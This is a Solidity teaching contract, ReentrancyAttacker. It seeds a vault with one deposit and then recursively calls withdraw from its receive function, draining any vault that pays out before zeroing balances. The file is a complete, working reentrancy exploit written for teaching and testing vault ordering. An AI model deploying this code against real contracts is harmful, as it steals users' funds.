// SPDX-License-Identifier: MIT
pragma solidity 0.8.30;

/// @notice The only vault surface this attacker needs. It is deliberately narrow:
///         the exploit uses nothing but the public teaching interface.
interface IVault {
    function deposit() external payable;
    function withdraw() external;
}

/// @title ReentrancyAttacker
/// @notice Teaching contract only. It drains a vault that pays out before
///         updating its books. One outer `withdraw` triggers a chain of nested
///         `withdraw` calls from inside this contract's `receive`.
contract ReentrancyAttacker {
    IVault public immutable vault;

    /// @notice The single honest deposit this contract makes before attacking.
    uint256 public unit;

    /// @notice How many times `receive` reentered the vault. Zero means the
    ///         ordering was safe and the callback could not withdraw again.
    uint256 public reentries;

    constructor(address vaultAddress) {
        vault = IVault(vaultAddress);
    }

    /// @notice Seed the vault with one deposit, then pull the first withdrawal.
    ///         The nesting happens inside `receive`, not here.
    function attack() external payable {
        require(msg.value != 0, "seed the attack with ETH");
        unit = msg.value;
        vault.deposit{value: msg.value}();
        vault.withdraw();
    }

    /// @dev The vault sends ETH here mid-`withdraw`. While it still has at least
    ///      one more unit to give, we call `withdraw` again before the vault has
    ///      zeroed our balance. Against a checks-effects-interactions vault this
    ///      nested call reverts, which aborts the whole withdrawal.
    receive() external payable {
        if (address(vault).balance >= unit) {
            reentries += 1;
            vault.withdraw();
        }
    }
}
